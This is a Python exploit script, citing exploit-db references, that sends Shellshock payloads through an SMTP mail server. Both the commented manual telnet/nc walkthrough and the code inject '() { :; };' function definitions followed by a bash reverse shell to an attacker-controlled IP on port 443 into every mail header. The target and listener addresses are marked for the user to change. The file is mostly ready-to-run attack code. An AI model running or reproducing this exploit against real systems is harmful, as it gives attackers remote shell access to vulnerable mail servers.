#!/usr/bin/python3

# ref from:
#     https://www.exploit-db.com/exploits/34896
#     https://www.exploit-db.com/exploits/35513

#
# smtp, send mail(payloads) by smtp;
#

# exploit manually example: {{{1

# $ telnet 192.168.31.164 25
#
# or:
# 
# $ nc -nvC 192.168.31.164 25

#220 mail.local ESMTP Postfix (Debian/GNU)
#mail from:attacker@local
#250 2.1.0 Ok
#rcpt to:victim@local
#250 2.1.5 Ok
#data
#354 End data with <CR><LF>.<CR><LF>
#To:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#References:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Cc:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Bcc:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#From:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Subject:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Date:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Message-ID:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Comments:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Keywords:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Resent-Date:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Resent-From:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#Resent-Sender:() { :; };/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#/bin/bash -i >& /dev/tcp/192.168.31.91/443 0>&1
#
#.
#
#250 2.0.0 Ok: queued as XXXXXXXX
#quit
#221 2.0.0 Bye
#
# }}}

import socket
import time

# change this
rhost = "192.168.31.164"
rport = 25
lhost = "192.168.31.91"
lport = 443
cmd = "/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".format(lhost=lhost, lport=lport)

mailFrom="attacker@local"
mailTo="victim@local"

charSet="utf-8"

# functions {{{1
#
# helper fun: formatData
# return: bytes
def formatData(data):
    data += "\r\n"
    return data.encode(charSet)

# receive data
def recv(skt, bufLen):
    ret=skt.recv(bufLen)
    time.sleep(0.2)
    print(ret.decode(charSet))
    return ret

# send data
def send(skt, data):
    data = formatData(data)
    print(data.decode(charSet))
    skt.send(data)

# }}}

# email headers
headers = ([
    "To",
    "References",
    "Cc",
    "Bcc",
    "From",
    "Subject",
    "Date",
    "Message-ID",
    "Comments",
    "Keywords",
    "Resent-Date",
    "Resent-From",
    "Resent-Sender"
    ])

try:
    # connect socket
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((rhost, rport))

    bufSize=2048*4
    retData=""

    # grab banner
    retData=recv(s, bufSize)

    data = "mail from:{account}".format(account=mailFrom)
    send(s, data)
    retData=recv(s, bufSize)

    data = "rcpt to:{account}".format(account=mailTo)
    send(s, data)

    retData=recv(s, bufSize)

    data = "data"
    send(s, data)

    retData=recv(s, bufSize)

    # create payloads
    # bytes
    data = bytes("", charSet)
    for h in headers:
        data += formatData(h + ":() { :; };" + cmd)

    data += formatData(cmd)

    # <CR><LF>.<CR><LF>
    data += "{newline}{dot}{newline}".format(newline="\r\n", dot=".").encode(charSet)
    # send by socket
    s.send(data)
    print(data.decode(charSet))

    retData=recv(s, bufSize)

    # quit smtp
    data = "quit"
    send(s, data)

    retData=recv(s, bufSize)

    # close socket
    s.close()
except Exception as ex:
    print(ex)
